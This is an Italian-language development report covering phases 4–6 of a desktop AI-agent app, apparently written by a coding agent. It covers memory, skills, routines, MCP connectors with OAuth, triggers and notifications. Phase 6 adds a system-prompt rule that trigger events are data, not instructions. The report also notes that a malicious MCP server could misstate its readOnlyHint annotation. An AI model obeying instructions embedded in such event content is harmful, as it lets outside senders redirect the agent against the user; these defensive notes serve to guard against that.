3. **Routine creata dall'agente:** "crea una routine 'Riepilogo mattina' con schedule 0 9 * * 1-5 (Europe/Rome)…" → `update_state create` senza approval → tabella routines: `enabled=0, provenance='agent', timezone='Europe/Rome'` → evento in chat "Routine creata (in pausa): Riepilogo mattina" (visibile, non dietro il toggle).
4. **Attivazione → card:** "attiva la routine" → `paused-for-approval` + card "update_state: attivare la routine \"Riepilogo mattina\" — nei giorni feriali alle 09:00 — prompt: …" → allow → `enabled=1` + evento "Routine attivata: Riepilogo mattina".
5. Pulizia: routine ri-messa in pausa, modello ripristinato, app e daemon chiusi (daemon.json rimosso correttamente). Nel DB di sviluppo restano le entry della verifica (147–205), la memoria "Nome: Fabio. Preferenza linguistica: italiana." (corretta e voluta) e la routine "Riepilogo mattina" in pausa.

## REPORT FASE 4

- **File modificati/creati:**
  - `src/main/agent/memory.ts` — **nuovo** — memoria a file: frontmatter, scope agent/user, selezione budget (core sempre, log recenti), ricerca per parole chiave, id runtime-only (no traversal).
  - `src/main/agent/skills.ts` — **nuovo** — SKILL.md in formato Claude Code, nome validato prima dei path, sezione prompt con soli nome+descrizione.
  - `src/main/agent/compaction.ts` — **nuovo** — piano puro (soglia 70%, confini di turno, minimo necessario), digest, orchestrazione con LLM iniettabile e fallback silenzioso.
  - `src/main/agent/update-state.ts` — **nuovo** — verdetto puro di update_state (resume/update-attiva = ask) + testo degli eventi automation.
  - `src/shared/cron-human.ts` — **nuovo** — describeCron: schedule in linguaggio naturale per la card (forme comuni, ripiego sull'espressione).
  - `src/main/agent/tools.ts` — tool defs + esecuzione di update_memory/recall_memory/skill/update_skill/update_state (routine con parseCron, create in pausa provenance agent, meta.automation).
  - `src/main/agent/permissions.ts` + `permission-rules.ts` — short-circuit always_allow per memoria/lettura skill; verdetto update_state con standing grant per routine; targetKey `skill <nome>` / `routine <id>`.
  - `src/main/agent/loop.ts` — compaction pre-buildMessages, system prompt con sezioni Memoria/Skill, evento automation dopo l'esecuzione, residuo 0c (interrupt → approval 'cancelled').
  - `src/main/agent/history.ts` — il summary sostituisce i turni coperti (`coversUpTo`), entra come messaggio utente di contesto.
  - `src/main/agent/prompts.ts` — regole "Memoria, skill e routine" nel system; `secondaryPrompts.compaction`.
  - `src/main/store/db.ts` — colonne routine description/timezone/provenance (+ALTER per DB esistenti), `getRoutine`, `createRoutine` con opts, regole di default dei nuovi tool.
  - `src/main/daemon-client.ts`, `src/renderer/src/store.ts`, `src/shared/types.ts` — residuo 0b: evento 'reconnected' alla riconnessione → la UI ricarica agenti ed entry.
  - `src/daemon/api.ts`, `src/main/ipc.ts`, `src/preload/index.ts` — RPC memory:list/update/delete, skills:list/delete.
  - `src/renderer/src/components/MemoryPanel.tsx`, `SkillsPanel.tsx` — **nuovi** — sezioni della vista agente (elenco, modifica/eliminazione memorie; istruzioni/eliminazione skill).
  - `src/renderer/src/components/Chat.tsx` — bottoni 🗂/🛠, rendering entry summary (solo col toggle ragionamento).
  - `src/renderer/src/components/ApprovalCard.tsx` — card dedicata update_state (nome, schedule naturale, prompt) + label 'cancelled'.
  - test: **nuovi** `memory.test.ts`, `skills.test.ts`, `compaction.test.ts`, `update-state.test.ts`, `cron-human.test.ts`, `daemon-client.test.ts`; estesi `loop.test.ts` (mock db con routine/dataDir, risposta-funzione con messages/tools), `permissions.test.ts`, `external-send.test.ts`.
- **Decisioni prese e perché:** (1) update_memory/recall_memory/skill sono consentiti con uno short-circuit nel gate PRIMA delle regole utente (oltre alle regole di default): la specifica li vuole always_allow e i file sono solo dell'agente — così una config utente salvata nelle fasi 1-3 non può degradarli a ask; una regola `blocked` invece vince su update_state/update_skill ma NON sui tool di memoria/lettura skill (scelta coerente con i tre tool di comunicazione di fase 3, che il gate non può bloccare); (2) il verdetto di update_state è una funzione pura che riceve la routine corrente: così i test non dipendono dallo store e il gate resta sottile; "Consenti sempre" su un resume salva una grant `routine <id>` (per routine, non per tool); (3) il confine di compaction è "prima di un messaggio utente" e il suffix contiene SEMPRE il turno corrente: il prefix riassunto è fatto di turni completi, quindi nessuna coppia tool spezzata in ciò che resta al modello; se nemmeno riassumendo tutto il passato si scende sotto soglia, si compatta solo se il prefix ha massa sufficiente (≥256 token stimati) perché il riepilogo porti un risparmio reale; (4) `timezone` delle routine viene accettata e persistita ma l'esecuzione resta nel fuso locale (nextCronRun non è tz-aware): dichiarato nei limiti, preferito al silenzio; (5) gli eventi automation sono entry `event` visibili in chat (non dietro il toggle) come nell'originale "automation-changed"; (6) il riavvio di routine poteva essere fatto anche ri-usando `routines:update` della UI, ma il click sulla card passa dallo stesso gate: la card è l'unico punto in cui "Consenti sempre" ha senso; (7) per 0b il client del daemon espone fabbrica ws + ensure iniettabili: il test simula connessione→caduta→riconnessione senza socket reali.
- **Deviazioni dalla specifica e perché:** (1) `describeCron` (schedule in linguaggio naturale) copre le forme cron comuni e ripiega sull'espressione grezza per i casi irregolari — un descrittore cron completo sarebbe fuori misura per una card; (2) il pannello Memoria modifica solo il contenuto (tier/scope restano quelli scelti dal bot o dall'utente via file): la specifica chiede "modifica ed eliminazione" senza dettagli; (3) come da convenzione, i residui sono in un commit separato (`fase 4: residui`, `6a1a913`).
- **Output di typecheck / vitest / build (ultime righe):** `tsc --noEmit` pulito (exit 0); vitest `Test Files 28 passed (28)` / `Tests 315 passed (315)`; build `✓ built` ×3 — `out/main/index.js 18.94 kB`, `out/main/daemon.js 160.84 kB`, preload `3.47 kB`, renderer `1.208,46 kB`.
- **Cosa NON è stato verificato:** (1) il rendering visivo dei pannelli Memoria/Skill e della card update_state NON è stato ispezionato a schermo: i dati che li alimentano (memory:list, skills:list, entry approval con input) sono stati verificati via RPC dal vivo e dai test, e il click sui bottoni DOM di Electron era già noto inaffidabile da computer use (fase 3); (2) la compaction non è stata osservata dal vivo (servirebbero decine di turni oltre soglia sul DB reale): coperta da test con store reale e LLM finto, incluso il wiring nel loop; (3) il percorso impacchettato dist/dmg (invariato rispetto alle fasi precedenti); (4) update_skill dal vivo (nessuna skill generata nella sessione: verificato da test con gate finto/vero e file reali).
- **Problemi fuori scope notati:** (1) `agents:delete` non rimuove le directory `agents/<id>/` (memoria e skill restano su disco: orfane, nessun rischio di leak verso altri agenti perché i path restano per id); (2) se un riassunto esiste già, un crash tra summary e modello può produrre un secondo summary ridondante al retry (il vecchio viene sostituito comunque in buildMessages: solo una chiamata LLM in più); (3) `applyDraftBody` scrive il body come stringa anche se l'argomento via.args era un array (stessa classe del residuo 0a, ma tocca la modifica manuale della bozza, non richiesta dalla specifica); (4) glm-5.3-flash su Ollama annida le tool call nel testo di send_to_user (qualità del modello, nessun intervento qui); (5) il ws-server resta mono-client: i probe di verifica calciano la finestra, che ora però si riprende da sola grazie al residuo 0b; (6) node-cron inutilizzato e avvisi rollup (invariati).

# Fase 5 — Connettori MCP + OAuth ("Connetti app")

**Data:** 2026-10-26 · **Commit:** `fase 5: connettori MCP+OAuth` · **Tag:** `fase-5`
**Scope:** §3.6/§6.1b — motore OAuth generico sui server MCP HTTP, catalogo come dati, UI "Connetti app", permessi dalle annotazioni MCP, funnel dei connettori per l'agente; prima del resto i residui della fase 4 (commit `fase 5: residui`).
**Verifica:** `npm run typecheck` pulito · `npx vitest run` **356 test, 34 file, tutti verdi** (321 post-residui + 35 nuovi) · `npm run build` verde · **flusso OAuth reale completato dal vivo su Cloudflare** (vedi sotto).

## Tabella punto per punto della specifica

| Punto | Stato | Dove |
|---|---|---|
| **0a** update_state non salva MAI grant; grant `routine <id>` vecchie ignorate | fatto | `permissions.ts:102` (ask senza consultare grant) + `permissions.ts:203` (grantStanding ignora update_state) + `ApprovalCard.tsx:23` (niente "Consenti sempre" sulla card) · test `permissions.test.ts`, `update-state.test.ts` (sequenza pausa→update prompt→resume con grant vecchia nel DB) |
| **0b** memorie scope 'user' (write/update/delete) → ask con contenuto in card | fatto | `update-state.ts:70` (`memoryScopeVerdict`, pura) + `permissions.ts:93` (per update_memory e update_state target memory; scope reale della memoria esistente via `currentMemoryScope`) · test M3 su db reale |
| **0c** applyDraftBody mantiene il tipo originale dell'argomento | fatto | `external-send.ts:88` (`coerceVisibleValue` esportata e usata in `applyDraftBody`) · test +1 |
| **0d** agents:delete rimuove `<dataDir>/agents/<id>/` | fatto | `db.ts:160` (solo per agente esistente) · test su db+fs reali |
| **1** OAuthClientProvider passato a StreamableHTTPClientTransport; discovery/PKCE/DCR dell'SDK | fatto | `connectors/oauth-provider.ts:47` (provider per server) + `mcp/index.ts:104` (authProvider nel trasporto); l'orchestrazione usa `auth()` dell'SDK (`connectors/index.ts:265`) |
| **1** redirect loopback RFC 8252, server ≤10 min, un solo codice, state verificato | fatto | `connectors/callback-server.ts:20` (`startCallbackServer`); browser di sistema via `host.openExternal` (`main/index.ts:68`, RPC `wiring.ts:36`) |
| **1** senza UI il connettore resta needs_auth, riparte all'apertura dell'app | fatto | `connectors/index.ts:292` (pendingAuth per entry) + `retryPendingAuth` su onUiChange (`daemon/index.ts:51`) · test 5/5 del flusso |
| **1** persistenza per server cifrata (tokens, client_information, code_verifier) senza safeStorage | fatto | `daemon/keychain.ts:55` (chiave AES-256 nel Keychain via `security -i`, comandi da stdin, lettura `find-generic-password -w`) + `connectors/sealed-store.ts:51` (envelope AES-256-GCM = vault) · test keychain (chiave mai in argv) + sealed-store |
| **1** refresh automatico; refresh fallito → needs_auth, prossimo uso → card "Riconnetti" | fatto | refresh gestito da `auth()` dell'SDK col provider; invalidazione → `markNeedsAuth` (`connectors/index.ts`); l'uso con token scaduto → `McpNeedsReconnectError` (`mcp/index.ts:183`) → card connector con needsAuth (`loop.ts:517`, ConnectorCard con "Riconnetti") · test refresh ok/fallito |
| **1** header statici e Bearer salvati cifrati | fatto | campo `bearer`/`staticHeaders` dello store cifrato; `mcp:save` col segreto (`api.ts:202`), resolver in `wiring.ts` (header nel requestInit); mai in chiaro nei settings |
| **2** catalog.json {id,name,logo,mcpUrl,clientRegistration,scopes?,docsUrl,notes} con SOLO voci verificate | fatto | `connectors/catalog.json` (8 voci, fonte ufficiale nelle notes) + `validateCatalog` (`connectors/index.ts:34`) · test schema/https/docsUrl |
| **2** Google static con client dell'utente (cifrati) + guida docs/google-oauth.md | fatto | voci gmail/gcalendar/gdrive (clientRegistration static), credenziali cifrate via `connectors:save-static`; `extraAuthParams access_type=offline&prompt=consent`; guida in `docs/google-oauth.md` |
| **3** griglia catalogo con stato non connesso/connesso/needs_auth/errore; Connetti/Disconnetti (revoca locale) | fatto | tab "connetti app" (`Settings.tsx:65` ConnectorsTab + ConnectorTile); RPC `connectors:list/connect/disconnect` (`api.ts:242`); evento `{type:'connectors'}` → UI si aggiorna (`store.ts:58`) |
| **3** per connesso: tool con interruttore (i disattivati non offerti al modello) + istruzioni personalizzate nel system prompt | fatto | `ConnectorTile` (checkbox per tool + textarea istruzioni) + `activeTools` filtra i disattivati (`mcp/index.ts`) + `connectorsInstructionsSection` iniettata nel system (`loop.ts:237`) · test puro |
| **3** server MCP manuali supportati nella stessa vista | fatto | `ManualServers` nella ConnectorsTab (form esistente + campo Bearer cifrato) |
| **4** annotazioni: readOnly→allow, destructive/openWorld→ask, assente→default; blocked vince; invii esterni restano bozze | fatto | `permission-rules.ts:149` (`mcpAnnotationMode` pura) + ramo mcp__ in `permissions.ts:144` (blocked > regola specifica > grant > annotazioni > default); lookup iniettato da `mcp/index.ts` (`setMcpAnnotationsLookup`); invii esterni intercettati a monte nel loop (invariato) · test 5 |
| **5** search_connectors({query}) con stato | fatto | def `tools.ts:202`, esecuzione con `searchCatalog`/`connectorStatusLine` (`connectors/index.ts`); sempre consentito (`permissions.ts`) · test loop |
| **5** offer_connector → entry 'connector' con bottone; connessione SOLO dal click; CONNECTOR_CONNECTED al bot | fatto | intercettazione nel loop (`loop.ts:399`), `ConnectorCard.tsx:10`; alla connessione `notifyConnectorConnected` (`api.ts:262`) accoda job user-message con `meta.initiator 'CONNECTOR_CONNECTED'` (`enqueue.ts:38`, `run-job.ts:26`) · test loop + notify |
| **6** test: AS finto (discovery/DCR/PKCE/scambio/state/refresh ok e fallito) | fatto | `connectors/__tests__/oauth.test.ts` (5 test end-to-end su 127.0.0.1 con "browser" finto che segue il redirect fino al callback reale) + `callback-server.test.ts` (3) + `sealed-store.test.ts` (4) + `keychain.test.ts` (3) + `catalog.test.ts` (8) + annotazioni (5) + loop (4) + notify (1) |

## Verifica manuale (flusso OAuth reale, connettore del catalogo)

Nota di metodo: invece di `npm run dev` (i click sui bottoni DOM di Electron sono noti inaffidabili dalle fasi 3–4), il daemon reale è stato avviato standalone sugli stessi dati dell'app con una probe che fa da client UI sullo stesso protocollo ws (stessa catena `connectors:connect` → `host.openExternal` → browser di sistema). Il consenso nel browser è stato dato via computer use. Risultato:

1. **`connectors:list`** → le 8 voci del catalogo con stato `not_connected` e, per Google, `hasStaticCredentials:false`.
2. **`connectors:connect cloudflare`** → discovery RFC 9728 + **DCR reale** (client_id registrato da mcp.cloudflare.com), URL di autorizzazione con PKCE S256, `redirect_uri=http://127.0.0.1:<porta>/callback` (il nostro loopback), `state`, `resource` (RFC 8707) e scope **read-only** (`user:read account:read`, dal `scopes_supported` del server).
3. Chrome ha aperto la pagina **"Authorize SandBot | Cloudflare"** (sessione utente attiva) → "Consent Application" con 1 permesso in sola lettura → click **Authorize** → redirect al nostro callback → pagina "✓ Connettore autorizzato".
4. Token persistiti: nei settings esiste SOLO `connectors.secrets` con envelope `sandVault` (nessun token in chiaro); il connettore è `connected` e il server MCP `cloudflare` è registrato con `auth: oauth`.
5. **Tool in sola lettura chiamato dal bot** (turno LLM reale, Ollama): messaggio "chiama il tool mcp__cloudflare__whoami…" → tool-call `mcp__cloudflare__whoami` → tool-result con la risposta VERA dell'API (`user:60d…`, email dell'account) → `send_to_user` col risultato → turno FINISHED. **Nessuna approval**: il tool è passato per l'annotazione `readOnlyHint` (punto 4 verificato dal vivo).
6. Daemon arrestato con SIGTERM (daemon.json e lock rimossi). Nel DB di sviluppo restano: il connettore Cloudflare CONNESSO (scope read-only, revocabile con un click da "Connetti app") e le entry 206–213 del turno di verifica nel transcript del bot "Bot".

## REPORT FASE 5
- **File modificati/creati:**
  - `src/daemon/keychain.ts` — **nuovo** — chiave AES-256 dei connettori nel Keychain macOS via `security -i` (comandi da stdin, mai argv), leggibile dal daemon senza UI.
  - `src/main/connectors/sealed-store.ts` — **nuovo** — segreti per server cifrati AES-256-GCM (envelope del vault), settings iniettabili per i test.
  - `src/main/connectors/oauth-provider.ts` — **nuovo** — OAuthClientProvider per l'SDK: redirect loopback, persistenza cifrata, parametri extra Google, invalidazione.
  - `src/main/connectors/callback-server.ts` — **nuovo** — redirect di loopback RFC 8252: un solo codice, state verificato, scadenza 10 minuti.
  - `src/main/connectors/catalog.json` + `src/main/connectors/index.ts` — **nuovi** — catalogo dati (fonti ufficiali nelle notes), validazione, ricerca, stato per connettore, sezione istruzioni, manager del flusso connect/disconnect/retry.
  - `src/main/connectors/wiring.ts` — **nuovo** — collegamento produzione: store con chiave Keychain, manager, resolver auth del client MCP (oauth/bearer/headers).
  - `src/main/mcp/index.ts` — authProvider/header nel trasporto, annotazioni dei tool (+lookup per il gate), tool disattivati filtrati, stato needs_auth, `McpNeedsReconnectError`, `toolsOfServer`.
  - `src/main/agent/permissions.ts`, `permission-rules.ts` — ramo mcp__ con annotazioni (blocked > regola specifica > grant > annotazioni > default), short-circuit search/offer_connector, residui M1/M3.
  - `src/main/agent/loop.ts` — offer_connector, card "Riconnetti" (meta.needsReconnect), istruzioni connettori nel system, initiator sul messaggio utente.
  - `src/main/agent/tools.ts` — def+esecuzione search_connectors, offer_connector, meta needsReconnect dai tool MCP.
  - `src/main/agent/update-state.ts` — `memoryScopeVerdict` (residuo M3).
  - `src/main/agent/external-send.ts` — `coerceVisibleValue` esportata e applicata in applyDraftBody (0c).
  - `src/main/agent/prompts.ts` — sezione "Le app che puoi collegare" (funnel §3ter T2-T3).
  - `src/main/store/db.ts` — regole default dei due tool nuovi; deleteAgent rimuove agents/<id>/ (0d).
  - `src/daemon/api.ts` — RPC connectors:* e mcp:save col segreto; `notifyConnectorConnected` (job CONNECTOR_CONNECTED).
  - `src/daemon/index.ts` — wireConnectors al boot + retryPendingAuth alla (ri)connessione UI.
  - `src/daemon/enqueue.ts`, `run-job.ts` — payload.initiator → meta.initiator del messaggio utente.
  - `src/main/index.ts` — host.openExternal (shell.openExternal).
  - `src/main/ipc.ts`, `src/preload/index.ts`, `src/shared/types.ts` — canali/binding/tipi (payload connector, evento connectors, API connettori).
  - `src/renderer/src/components/Settings.tsx` — tab "connetti app": griglia catalogo con stato, credenziali statiche Google cifrate, tool per connettore con interruttore, istruzioni, server manuali (+Bearer cifrato).
  - `src/renderer/src/components/ConnectorCard.tsx` — **nuovo** — card di offerta con bottone Connetti/Riconnetti (solo dall'utente).
  - `src/renderer/src/components/ApprovalCard.tsx` — niente "Consenti sempre" su update_state (M1).
  - `src/renderer/src/store.ts` — connectors + evento 'connectors'.
  - `docs/google-oauth.md` — **nuovo** — guida client OAuth Google (Desktop app, redirect loopback, access_type=offline).
  - test nuovi: `connectors/__tests__/{oauth,callback-server,sealed-store,catalog}.test.ts`, `daemon/__tests__/{keychain,connector-notify}.test.ts`; estesi `permissions.test.ts` (annotazioni + M1/M3), `loop.test.ts` (offer/reconnect), `update-state.test.ts` (residui), `external-send.test.ts` (0c).
- **Decisioni prese e perché:** (1) chiave dei segreti nel Keychain via `security -i` e NON safeStorage: il daemon deve usare i token anche a finestra chiusa (le routine), e safeStorage senza UI resta bloccato (fase 2) — stesso argomento del vault, risolto con una chiave separata mai nell'argv; (2) orchestratore `auth()` dell'SDK come unico punto d'ingresso (discovery/DCR/PKCE/refresh non reimplementati): il manager lo invoca due volte (pre e post codice) e la persistenza cifrata sta nel provider; (3) il provider del trasporto (refresh a runtime) usa un redirectUrl fittizio e un openExternal "silenzioso": se serve di nuovo l'utente non apre browser di nascosto, manda il connettore in needs_auth e la card "Riconnetti" nasce dall'errore del tool; (4) status del connettore persistito nei settings e riverificato con probe live in `connectors:list`: la UI mostra lo stato vero, `activeTools` salta i server in needs_auth/error (niente retry lenti a ogni turno); (5) le annotazioni arrivano al gate con lookup iniettato dal modulo mcp (nessun import inverso permissions→mcp) e precedono la regola generica `mcp__*` ma NON le regole specifiche dell'utente né le blocked; (6) `connect` non blocca la RPC (il browser dura minuti): fire-and-forget + evento `{type:'connectors'}`; (7) `pendingAuth` conserva l'ENTRY richiesta (non solo l'id): il retry alla riapertura della UI usa esattamente quella; (8) Google: la guida ufficiale propone client "Web application" con redirect dei client di Google; per un'app nativa abbiamo documentato "Desktop app" + loopback come da specifica, aggiungendo `access_type=offline&prompt=consent` (indicati dalla stessa guida per il refresh token); (9) le offerte pendenti si marcano `meta.connected` alla connessione: la notifica CONNECTOR_CONNECTED parte una volta sola e anche se l'utente connette dalle Impostazioni.
- **Deviazioni dalla specifica e perché:** (1) la verifica manuale è avvenuta col daemon standalone + probe ws come UI invece di `npm run dev`: il click sui bottoni DOM di Electron è inaffidabile (fasi 3–4) e la catena esercitata è identica a quella dell'app (stessa RPC, stesso host.openExternal, browser reale, consenso reale via computer use); (2) `logo` del catalogo è un emoji, non un URL: la specifica chiede il campo ma nessuna sorgente ufficiale fornisce logotipo stabile — niente URL inventati; (3) il bottone "Connetti" della ConnectorCard non è stato premuto fisicamente nella finestra (vedi sopra): la card è verificata a livello di payload/rendering e la RPC dietro il click dal vivo.
- **Output di typecheck / vitest / build (ultime righe):** `tsc --noEmit` pulito (exit 0); vitest `Test Files 34 passed (34)` / `Tests 356 passed (356)`; build `✓ built` ×3 — `out/main/index.js 19.19 kB`, `out/main/daemon.js 205.56 kB`, preload 4.07 kB, renderer 1.220,93 kB.
- **Cosa NON è stato verificato:** (1) il rendering visivo della tab "connetti app" e della ConnectorCard dal vivo (dati e payload verificati via RPC/test; click DOM in Electron notoriamente inaffidabile); (2) il flusso Google static END-to-END (serve un progetto Cloud con API in Developer Preview: documentato in docs/google-oauth.md, verificato a livello di provider/store/test); (3) la revoca LOCALE in produzione (disconnessione verificata dai test del manager, non dal vivo); (4) il refresh automatico di un token REALE scaduto (l'access token Cloudflare dura 1h: il percorso è coperto dai test con AS finto e dal provider silenzioso in wiring); (5) il pacchetto dist/dmg (invariato rispetto alle fasi precedenti).
- **Voci del catalogo incluse (fonte ufficiale nelle notes):** cloudflare (developers.cloudflare.com + blog DCR), sentry (mcp.sentry.dev, getsentry/toolkit), stripe (docs.stripe.com/mcp), notion (developers.notion.com/guides/mcp), linear (linear.app/integrations, endpoint mcp.linear.app/mcp documentato su linear.app/integrations/codex-mcp), gmail/gcalendar/gdrive (docs.cloud.google.com/mcp/supported-products + guida configure-mcp-server, registrazione statica). **Escluse:** Atlassian (mcp.atlassian.com/v1/sse — DCR documentato solo per client in allowlist, non verificabile per un client arbitrario), GitHub remote (api.githubcopilot.com/mcp richiede PAT/OAuth app di GitHub, non DCR aperto), HubSpot/Box/QuickBooks (scambio token solo backend del vendor, irraggiungibile da un client locale), aggregatori (Composio/Zapier/Pipedream: URL per-account, non verificabili), Deepwiki (server pubblico SENZA OAuth: non c'è flusso da testare).
- **Problemi fuori scope notati:** (1) il ws-server resta mono-client: la probe di verifica calcia la finestra dell'app (che ora si riprende con l'evento reconnected, residuo 0b fase 4); (2) i token OAuth dei connettori non hanno scadenza forzata lato client: se il server li revoca, la si scopre al primo 401 (accettabile: la card Riconnetti copre il caso); (3) `connectors:list` fa una probe live per connettore registrato (cache 5 min del client MCP): con molti connettori connessi la lista può impiegare qualche secondo; (4) l'annotazione `readOnlyHint` è dichiarata dal server: un server malevolo potrebbe mentire (confidenza nel vendor, come nell'originale); (5) node-cron inutilizzato e avvisi rollup (invariati); (6) la guida Google citava anche il flag "Use this client for an AI-powered agent" dei client web: non applicabile al tipo Desktop, segnalato nella guida.

# Fase 6 — Trigger, presenza, finestre di consegna, notifiche

**Data:** 2026-10-26/27 · **Commit:** `fase 6: residui` (ad08e39) + `fase 6: trigger e presenza` · **Tag:** `fase-6`
**Scope:** §3bis L3 (trigger delle automazioni), L4 (finestre di consegna), L9 (notifiche e presenza) + §3ter T2 (check-in al rientro); prima del resto i residui (commit separato).
**Verifica:** `npm run typecheck` pulito · `npx vitest run` **461 test, 42 file, tutti verdi** (366 pre-fase + 95 nuovi) · `npm run build` verde · **flusso verificato dal vivo col daemon reale** (vedi sotto).

## Residui (commit `fase 6: residui`, ad08e39)

- **0a — Annotazioni MCP solo per server affidabili.** `mcpAnnotationMode(a, catalogServer)` (`permission-rules.ts:156`): l'auto-allow da `readOnlyHint` vale SOLO per i server con `catalogId` (registrati dai connettori del catalogo da `wireConnectors`); per i server manuali readOnlyHint non dà allow (resta needs_approval, salvo regole/grant esplicite dell'utente). `annotationsFor` (`mcp/index.ts:234`) fornisce annotazioni + flag catalogServer al gate. `destructiveHint`/`openWorldHint` → ask restano validi per TUTTI i server. Test: `permissions.test.ts` (+3).
- **0b — Vault senza UI.** La chiave master del vault vive nel Keychain macOS con lo stesso meccanismo dei connettori (`security -i` da stdin, voce SEPARATA `sandbot-vault-key` — `daemon/keychain.ts` generalizzato con `getKeychainKey(service)`, `vault.ts:83` `getMasterKey`): lettura da Keychain → migrazione dal setting safeStorage (possibile solo con la UI aperta: decifratura via HostBridge, poi scrittura nel Keychain e rimozione del setting) → prima generazione nel Keychain. Migrazione proattiva all'apertura della finestra (`daemon/index.ts:104`). L'ORDINE importa: la chiave legacy si riusa PRIMA di generarne una nuova (altrimenti i segreti esistenti diventerebbero indecifrabili). Test `vault-keychain.test.ts` (8) con runner `security` finto: la chiave non compare mai negli argv.

## Tabella punto per punto della specifica

| Punto | Stato | Dove |
|---|---|---|
| **0a** auto-allow da readOnlyHint solo per server del catalogo; destructive/openWorld → ask restano per tutti | fatto | `permission-rules.ts:156` + `mcp/index.ts:234` + `permissions.ts` lookup `{annotations, catalogServer}` · test `permissions.test.ts` |
| **0b** vault su Keychain (voce separata, `security -i` stdin), migrazione da safeStorage via HostBridge, test con runner finto | fatto | `daemon/keychain.ts` (generalizzato), `vault.ts:64,83`, `daemon/index.ts:104` · test `vault-keychain.test.ts` (chiave mai in argv) |
| **1** `trigger_json` sulle routine (colonna nuova + ALTER; cron legacy resta valido) | fatto | `db.ts:79-102` (trigger_json, paused_for_away, last_poll) |
| **1** schedule: cron **oppure** {every, at, weekday?, monthDay?, mode at/around}; around = ±15 min DETERMINISTICI (seed id+data) | fatto | tipi `shared/types.ts`, `nextEveryRun` (`daemon/triggers.ts:50`), jitter `aroundJitterMinutes` (`shared/triggers.ts:34`, FNV-1a) · test tz-triggers (determinismo, range, occorrenza proiettata nel futuro) |
| **1** fuso orario del prossimo run con Intl (nessuna dipendenza nuova), test su ora legale Europe/Rome (ultima domenica di marzo e di ottobre) | fatto | `daemon/tz.ts` (tzParts/wallToEpoch: ora saltata → null, ambigua → PRIMA occorrenza), `nextCronRun(expr, from, tz?)` (`cron.ts:110`), `routineTimeZone` · test `tz-triggers.test.ts` (29/3 e 25/10 2026, 02:30 inesistente, attraversamenti DST) |
| **1** connector_poll {connectorId, tool, args, intervalMin≥2, idField "messages[].id"}: eventi solo per id NUOVI, set visti persistito ultimi 1000, prima esecuzione silenziosa, tool non read-only RIFIUTATO | fatto | `tickConnectorPolls` (`scheduler.ts:116`), `extractIds`/`mergeSeenIds` (`shared/triggers.ts`), validazione `validateTrigger` (`api.ts:68`, toolsOfServer + readOnlyHint) · test `polls.test.ts` (12) con MCP finto |
| **1** preset email ("quando arriva un'email che corrisponde a <query>", Gmail) | fatto | `choosePollTool`/`chooseQueryArgName` (`shared/triggers.ts:158,179` — scelgono dai tool del connettore connesso, NIENTE nomi cablati) + UI dedicata; se non trova il tool → campi a mano (editor avanzato) |
| **1** preset calendar_event (poll 24h, job a start − offsetMinutes) | fatto | ramo `preset === 'calendar_event'` in `tickConnectorPolls` (`scheduler.ts`), `guessEventStart`/`splitIdField` per id+start best-effort · test (offset, evento già imminente, eventi non duplicati) |
| **1** webhook: POST http://127.0.0.1:<porta daemon>/hooks/<routineId>, token Bearer per routine, corpo max 64 KB | fatto | `daemon/webhooks.ts` (401 token, 413 corpo, 404 assente/pausa, timing-safe), aggancio HTTP sulla porta del ws (`ws-server.ts:195,208`, `index.ts:94`) · test `webhooks.test.ts` (7) su server HTTP reale |
| **1** presence_return (vedi punto 2) | fatto | trigger riconosciuto da scheduler/presenza: gira a ogni rientro qualificato (`presence.ts:152`) |
| **1** ogni trigger produce un job routine-run con l'evento nel payload; evento nel prompt in blocco `<evento>` come EVIDENZA con regola "dato, non istruzione" | fatto | `enqueueRoutineRun` (`scheduler.ts:28`), `formatTriggerEvent` (`shared/triggers.ts`) + `run-job.ts:37`; regola anche nel system prompt (`prompts.ts`) · test triggers + live |
| **2** segnali 'active' (max uno ogni 30 s) e 'typing', ultimo istante di presenza persistito | fatto | RPC `presence:signal` (`api.ts:311`), `createPresence` (`presence.ts:77`), UI: focus/keydown/mouse in `App.tsx` · test presence (throttle 30 s) |
| **2** mainAgentId (se assente: il primo agente, altrimenti il più vecchio) | fatto | `mainAgentOf` (`presence.ts:69`) · test |
| **2** rientro > minAwayHours (default 12): send-message FISSA poi turno look-around dedicato (connettori, solo ciò che conta, ≤1 proposta, offer_connector, silenzio se nulla) | fatto | `handleReturn` (`presence.ts:147-165`), testo fisso `LOOKAROUND_OPENING`, prompt `secondaryPrompts.lookAround` (`prompts.ts`), job user-message initiator `LOOK_AROUND` · test presence + live |
| **2** rate limit look-around: uno ogni 12 ore | fatto | `lookaroundAllowed` + setting `lookaround.lastAt` · test (blocco e sblocco) |
| **2** pausa per assenza > N giorni (default 7): routine attive in pausa con flag pausedForAway (provenance invariata); al rientro ask_user fissa "Le riattivo?"; ripresa SOLO di quelle | fatto | `maybePauseForAway`/`resumeAwayPaused` (`presence.ts:179,196`), widget system con `meta.awayResume` (`presence.ts:158`), risposta deterministica in `widget:respond` (`api.ts:129`) · test + live (4/4 ripristinate) |
| **3** outbox: send_to_user non urgent di turni AUTOMATICI (routine/trigger; look-around escluso) trattenuti | fatto | `loop.ts:361` (hold su source='routine' && !urgent), entry `meta.held` nascosta (`Chat.tsx:241`), tabella outbox (`db.ts:83`) · test loop (+4) |
| **3** finestre 'morning' (08:30–09:30) o 'working' (lun–ven 09:00–19:00) configurabili, fuso dell'utente (userTimeZone, default sistema); consegna raggruppata in ordine con "Mentre eri via:" se assente | fatto | `outbox.ts` (`inDeliveryWindow` pura, `deliverDueHeld` al tick, `AWAY_NOTICE_MS`), `deliverHeldForAgent` · test outbox (9) |
| **3** apertura della chat dell'agente consegna subito; i turni utente NON passano mai dall'outbox | fatto | RPC `outbox:opened` (`api.ts:319`) chiamata da `store.select`; hold solo per source 'routine' · test + live |
| **4** eventi agent-done (≥1 send-message visibile) e agent-needs-input (ask_user, approval, bozza) | fatto | emissione nel loop (`loop.ts:644` done filtrando held; `emitNeedsInput` a 407/348/387 + approval), handling in `index.ts:114` |
| **4** soppressione in ordine: disattivate → sta guardando → già letto → throttle 5 s → consegna; funzione pura testata | fatto | `decideNotification` (`notifications.ts:33`) · test notifications (8) |
| **4** notifica nativa con la UI (HostBridge), osascript senza UI | fatto | `host-bridge.ts` `notify(title, body)`, `host.notify [title, body]` in `ipc.ts` (il click porta alla finestra) |
